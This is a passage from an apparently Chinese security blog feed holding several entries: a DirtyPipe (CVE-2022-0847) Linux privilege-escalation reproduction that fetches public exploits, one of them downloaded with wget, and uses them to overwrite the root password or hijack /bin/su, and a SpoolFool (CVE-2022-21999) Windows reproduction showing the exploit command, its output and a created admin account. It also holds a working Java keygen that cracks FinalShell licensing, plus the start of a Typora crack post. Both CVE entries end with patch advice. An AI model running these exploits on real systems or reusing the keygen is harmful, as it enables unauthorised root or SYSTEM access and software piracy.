<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220309185454552.png" alt="image-20220309185454552" /></p>
<h2 id="环境搭建"><a class="anchor" href="#环境搭建">#</a> 环境搭建</h2>
<blockquote>
<p>建议在搭建环境前，先打好快照</p>
</blockquote>
<p>这里我们采用在受影响的 linux 机搭建环境，也可以用 metarget 集成环境来中进行，<span class="exturl" data-url="aHR0cHM6Ly93d3cuMjFyMDAwLnRvcC9hcnRpY2xlL2IzNjE3MzYyLmh0bWw=">metarget 搭建教程</span>在这片博文中</p>
<p>metarget 环境依赖：</p>
<ul>
<li>Ubuntu 16.04 或 18.04（推荐）</li>
<li>Python &gt;= 3.6 (不支持 Python 2.x！)</li>
<li>pip3</li>
</ul>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">git</span> clone https://github.com/brant-ruan/metarget.git</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">cd</span> metarget/</pre></td></tr><tr><td data-num="3"></td><td><pre>pip3 <span class="token function">install</span> -r requirements.txt</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">sudo</span> ./metarget cnv <span class="token function">install</span> cve-2022-0847</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220309190329713.png" alt="image-20220309190329713" /></p>
<p>最后输入 y 等待环境重启即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220309190425793.png" alt="image-20220309190425793" /></p>
<p>环境搭建好后，查看当前系统内核</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">uname</span> -r</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220309204317628.png" alt="image-20220309204317628" /></p>
<p>即可发现系统内核已经是  <code>5.8</code>  的了，说明是可以受到该漏洞的影响的了。</p>
<h2 id="漏洞复现-2"><a class="anchor" href="#漏洞复现-2">#</a> 漏洞复现</h2>
<h3 id="方法一cve-2022-0847-dirtypipe-poc"><a class="anchor" href="#方法一cve-2022-0847-dirtypipe-poc">#</a> 方法一：CVE-2022-0847-DirtyPipe-Poc</h3>
<p>我们在 <code>kali</code>  的普通用户状态下把 <code>GitHub</code>  上的 <code>POC</code>  下载下来，这里我找了两个版本的 <code>poc</code> ，但是使用方法差不多</p>
<ul>
<li><code>CVE-2022-0847-DirtyPipe-Exploit</code> ：修改 <code>root</code>  密码为： <code>aaron</code></li>
<li><code>CVE-2022-0847</code> ：将 <code>root</code>  密码清除，实现无密码登录</li>
</ul>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">git</span> clone git://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#git clone https://github.com/imfiver/CVE-2022-0847</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin class-name">cd</span> CVE-2022-0847-DirtyPipe-Exploit</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220309192922177.png" alt="image-20220309192922177" /></p>
<p>开始提权</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>gcc exploit.c -o exploit</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> ./exploit</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220309193259937.png" alt="image-20220309193259937" /></p>
<p>记住要加 <code>sudo</code>  否则提示无权限修改密码文件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220309193337103.png" alt="image-20220309193337103" /></p>
<p>如此即可以 <code>aaron</code>  作为密码进行密码登录 <code>root</code></p>
<p>也可以将 <code>POC</code>  中的 <code>passwd</code>  改为你所想要的密码来进行登录</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220309193416669.png" alt="image-20220309193416669" /></p>
<p>根据作者的提示，如果报错：  <code>su: must be run from a terminal</code> ，则表示没提权成功，而且问题也暂时没有修复建议。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220309192202517.png" alt="image-20220309192202517" /></p>
<p>恢复原来密码</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#恢复原来的密码</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/passwd</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">sudo</span> <span class="token function">mv</span> /tmp/passwd /etc/passwd</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220309193957823.png" alt="image-20220309193957823" /></p>
<h3 id="方法二dirtypipezc-suid提权"><a class="anchor" href="#方法二dirtypipezc-suid提权">#</a> 方法二：dirtypipez.c SUID 提权</h3>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#下载项目</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">mkdir</span> dirtypipez</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin class-name">cd</span> dirtypipez</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">wget</span> https://haxx.in/files/dirtypipez.c</pre></td></tr><tr><td data-num="5"></td><td><pre>gcc dirtypipez.c -o dirtypipez</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220309193538344.png" alt="image-20220309193538344" /></p>
<p>这个  <code>POC</code>  需要事先找到一个具有  <code>SUID</code>  权限的可执行文件，然后利用这个文件进行提权</p>
<p>使用以下命令可以找到这类文件</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220309193602569.png" alt="image-20220309193602569" /></p>
<p>这里就以  <code>/bin/su</code>  为例了，直接  <code>./dirtypipez</code>  跟上具有  <code>SUID</code>  权限的文件即可提权</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>./dirtypipez /bin/su</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220309193648667.png" alt="image-20220309193648667" /></p>
<h1 id="漏洞修复"><a class="anchor" href="#漏洞修复">#</a> 漏洞修复</h1>
<p>更新升级 Linux 内核到以下安全版本：</p>
<ul>
<li>Linux 内核 &gt;= 5.16.11</li>
<li>Linux 内核 &gt;= 5.15.25</li>
<li>Linux 内核 &gt;= 5.10.102</li>
</ul>
<h2 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9kaXJ0eXBpcGUuY200YWxsLmNvbS8=">The Dirty Pipe Vulnerability</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly90ZWFtc3NpeC5jb20vMjIwMzA4LTEyMDAwOC5odG1s">【漏洞复现】DirtyPipe CVE-2022-0847 Linux 内核提权漏洞复现</span></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-21999 SpoolFool打印机提权漏洞复现</title>
    <url>/article/d4c0014b.html</url>
    <content><![CDATA[<h2 id="0x01前言"><a class="anchor" href="#0x01前言">#</a> 0x01 前言</h2>
<p>Windows Print Spooler 是所有 Windows 工作站和服务器上的内置组件，它是打印界面的主要组件。Print Spooler 是管理打印过程的可执行文件。打印管理包括检索正确打印机驱动程序的位置、加载该驱动程序、将高级函数调用假脱机到打印作业、调度打印作业以进行打印等等。后台处理程序在系统启动时加载并继续运行，直到操作系统关闭。而<strong> Windows 的打印机程序无论是个人机还是服务器都是默认启动</strong>。</p>
<p><strong>spoolsv.exe</strong><br />
poolsv.exe 是 Spooler 的 API 服务器。它被实现为操作系统启动时启动的服务。此模块将 RPC 接口导出到 Spooler 的 Win32 API 的服务器端。spoolsv.exe 包括 winspool.drv（本地）和 win32spl.dll（远程）的客户。该模块实现了一些 API 函数，但大多数函数调用通过路由器 (spoolss.dll) 传递给打印提供者。</p>
<p><strong>漏洞编号</strong>: CVE-2022-21999</p>
<p>PS：该漏洞系 Printnightmare 的续集，包括 CVE-2020–1030 的两次绕过，漏洞利用的步骤如下</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>创建一个临时基目录，用于我们的假脱机目录，稍后我们将把它变成一个重解析点</pre></td></tr><tr><td data-num="2"></td><td><pre>创建名为“Microsoft XPS Document Writer v4”的新本地打印机</pre></td></tr><tr><td data-num="3"></td><td><pre>将新打印机的假脱机目录设置为我们的临时基础目录</pre></td></tr><tr><td data-num="4"></td><td><pre>在我们的临时基目录上创建一个重解析点以指向打印机驱动程序目录</pre></td></tr><tr><td data-num="5"></td><td><pre>AppVTerminator.dll通过加载到 Spooler中强制 Spooler 重新启动以创建目录</pre></td></tr><tr><td data-num="6"></td><td><pre>将 DLL 写入打印机驱动程序目录内的新目录</pre></td></tr><tr><td data-num="7"></td><td><pre>将 DLL 加载到 Spooler</pre></td></tr></table></figure><p><strong>影响版本</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tc3JjLm1pY3Jvc29mdC5jb20vdXBkYXRlLWd1aWRlL3Z1bG5lcmFiaWxpdHkvQ1ZFLTIwMjItMjE5OTk=">详情参考链接</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220318114406383.png" alt="image-20220318114406383" /></p>
<h2 id="0x02漏洞复现"><a class="anchor" href="#0x02漏洞复现">#</a> 0x02 漏洞复现</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x5NGsvU3Bvb2xGb29s">SpoolFool exp 地址</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220318114710072.png" alt="image-20220318114710072" /></p>
<p>下载解压：<br />
<img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220318114858531.png" alt="image-20220318114858531" /><br />
 输入命令</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>SpoolFool.exe -dll AddUser.dll</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220318122701393.png" alt="image-20220318122701393" /></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using printer name: Microsoft XPS Document Writer v4</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using driver directory: <span class="token number">4</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using temporary base directory: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>21r000<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Local<span class="token punctuation">\</span>Temp<span class="token punctuation">\</span>385ccf7d-0846-462e-8b19-4e48eb87bcba</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Trying to <span class="token function">open</span> existing printer: Microsoft XPS Document Writer v4</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Failed to <span class="token function">open</span> existing printer: Microsoft XPS Document Writer v4</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Trying to create printer: Microsoft XPS Document Writer v4</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Created printer: Microsoft XPS Document Writer v4</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Setting spool directory to: <span class="token punctuation">\</span><span class="token punctuation">\</span>localhost<span class="token punctuation">\</span>C$<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>21r000<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Local<span class="token punctuation">\</span>Temp<span class="token punctuation">\</span>385ccf7d-0846-462e-8b19-4e48eb87bcba<span class="token punctuation">\</span><span class="token number">4</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Successfully <span class="token builtin class-name">set</span> the spool directory to: <span class="token punctuation">\</span><span class="token punctuation">\</span>localhost<span class="token punctuation">\</span>C$<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>21r000<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Local<span class="token punctuation">\</span>Temp<span class="token punctuation">\</span>385ccf7d-0846-462e-8b19-4e48eb87bcba<span class="token punctuation">\</span><span class="token number">4</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Creating junction point: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>21r000<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Local<span class="token punctuation">\</span>Temp<span class="token punctuation">\</span>385ccf7d-0846-462e-8b19-4e48eb87bcba -<span class="token operator">></span> C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>spool<span class="token punctuation">\</span>DRIVERS<span class="token punctuation">\</span>x64</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Forcing spooler to restart</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Waiting <span class="token keyword">for</span> spooler to restart<span class="token punctuation">..</span>.</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Spooler restarted</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Successfully created driver directory: C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>spool<span class="token punctuation">\</span>DRIVERS<span class="token punctuation">\</span>x64<span class="token punctuation">\</span><span class="token number">4</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Copying DLL: .<span class="token punctuation">\</span>AddUser.dll -<span class="token operator">></span> C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>spool<span class="token punctuation">\</span>DRIVERS<span class="token punctuation">\</span>x64<span class="token punctuation">\</span><span class="token number">4</span><span class="token punctuation">\</span>AddUser.dll</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Granting <span class="token builtin class-name">read</span> and execute to SYSTEM on DLL: C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>spool<span class="token punctuation">\</span>DRIVERS<span class="token punctuation">\</span>x64<span class="token punctuation">\</span><span class="token number">4</span><span class="token punctuation">\</span>AddUser.dll</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Loading DLL as SYSTEM: C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>spool<span class="token punctuation">\</span>DRIVERS<span class="token punctuation">\</span>x64<span class="token punctuation">\</span><span class="token number">4</span><span class="token punctuation">\</span>AddUser.dll</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> DLL should be loaded</pre></td></tr></table></figure><p>执行成功后则会生成一个本地管理员 admin 的用户。</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>admin / Passw0rd<span class="token operator">!</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220318122749031.png" alt="image-20220318122749031" /></p>
<p>系统版本：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220318123024538.png" alt="image-20220318123024538" /></p>
<h2 id="0x03漏洞修复"><a class="anchor" href="#0x03漏洞修复">#</a> 0x03 漏洞修复</h2>
<p>参考：<span class="exturl" data-url="aHR0cHM6Ly9tc3JjLm1pY3Jvc29mdC5jb20vdXBkYXRlLWd1aWRlL3Z1bG5lcmFiaWxpdHkvQ1ZFLTIwMjItMjE5OTklRTQlQkYlQUUlRTUlQTQlOEQlRTUlQkIlQkElRTglQUUlQUUlRTQlQjglOEIlRTglQkQlQkQlRTglQTElQTUlRTQlQjglODElRTglQkYlOUIlRTglQTElOEMlRTQlQkYlQUUlRTUlQTQlOEQlRTMlODAlODI=">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21999 修复建议下载补丁进行修复。</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220318114406383.png" alt="image-20220318114406383" /></p>
<h2 id="0x04参考链接"><a class="anchor" href="#0x04参考链接">#</a> 0x04 参考链接</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvVklaQVBlQVhMZkdlNFdSMVdHSEtmQQ==">【提权】CVE-2022-21999 SpoolFool 打印机提权漏洞复现</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220318130719074.png" alt="image-20220318130719074" /></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>windows漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>FinalShell3.9.3.4离线破解记录</title>
    <url>/article/e6e5cbde.html</url>
    <content><![CDATA[<h2 id="环境配置"><a class="anchor" href="#环境配置">#</a> 环境配置</h2>
<ul>
<li>FinalShell3.9.3.4</li>
<li>Java 运行环境</li>
<li>离线（互联网未连接状态）</li>
</ul>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5ob3N0YnVmLmNvbS9kb3dubG9hZHMvZmluYWxzaGVsbF9pbnN0YWxsLmV4ZQ==">Windows 版下载地址</span></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5ob3N0YnVmLmNvbS9kb3dubG9hZHMvZmluYWxzaGVsbF9pbnN0YWxsLnBrZw==">macOS 版下载地址</span></p>
<h2 id="破解教程"><a class="anchor" href="#破解教程">#</a> 破解教程</h2>
<p>1. 使用 FinalShell 离线激活方式升级高级版本</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305195422569.png" alt="image-20220305195422569" /></p>
<p>2. 获取机器码 (如果没有就随意输入用户名或密码执行登录)</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305195502033.png" alt="image-20220305195502033" /></p>
<p>3. 执行下面代码，输入机器码获取激活码</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">MessageDigest</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">NoSuchAlgorithmException</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FinalShell</span>激活 <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchAlgorithmException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"请输入FinalShell的离线机器码："</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token class-name">Scanner</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token class-name">String</span> machineCode <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token function">generateKey</span><span class="token punctuation">(</span>machineCode<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">generateKey</span><span class="token punctuation">(</span><span class="token class-name">String</span> hardwareId<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchAlgorithmException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token class-name">String</span> proKey <span class="token operator">=</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token number">61305</span> <span class="token operator">+</span> hardwareId <span class="token operator">+</span> <span class="token number">8552</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token class-name">String</span> pfKey <span class="token operator">=</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token number">2356</span> <span class="token operator">+</span> hardwareId <span class="token operator">+</span> <span class="token number">13593</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请将此行复制到离线激活中："</span><span class="token operator">+</span>proKey<span class="token operator">+</span><span class="token string">"高级版"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请将此行复制到离线激活中："</span><span class="token operator">+</span>pfKey<span class="token operator">+</span><span class="token string">"专业版"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchAlgorithmException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token class-name">String</span> md5 <span class="token operator">=</span> <span class="token function">hashMD5</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">return</span> <span class="token function">hashMD5</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">hashMD5</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchAlgorithmException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token class-name">MessageDigest</span> digest <span class="token operator">=</span> <span class="token class-name">MessageDigest</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"MD5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> hashed <span class="token operator">=</span> digest<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">byte</span> b <span class="token operator">:</span> hashed<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>            <span class="token keyword">int</span> len <span class="token operator">=</span> b <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>                sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toHexString</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        <span class="token keyword">return</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305203306165.png" alt="image-20220305203306165" /></p>
<p>4. 成功激活</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305195727079.png" alt="image-20220305195727079" /></p>
<h2 id="弊端"><a class="anchor" href="#弊端">#</a> 弊端</h2>
<p>每次重新打开的时候都会处于未激活状态，这时候只要重新激活一下就好了，所有的离线激活信息都会保存</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305202606832.png" alt="image-20220305202606832" /></p>
<p>but 如果闲麻烦的话也可以自费购买正版哦！</p>
<h2 id="注"><a class="anchor" href="#注">#</a> 注！！！</h2>
<p><code>一定要处于未联网状态的情况下进行激活，用户名和密码可自行输入，根据生成的机械码来生成激活码！！</code></p>
]]></content>
      <categories>
        <category>STools</category>
      </categories>
      <tags>
        <tag>STools</tag>
      </tags>
  </entry>
  <entry>
    <title>Typroa-v1.0破解记录</title>
    <url>/article/ce12b2b3.html</url>
    <content><![CDATA[<p>Typroa 从当初的免费开源用到现在开始收费，早已习惯了 Typroa 的使用，但迟迟没有破解，趁着偷闲时候来破解一番</p>
<p>这样的索大谁能不爱啊！！！</p>
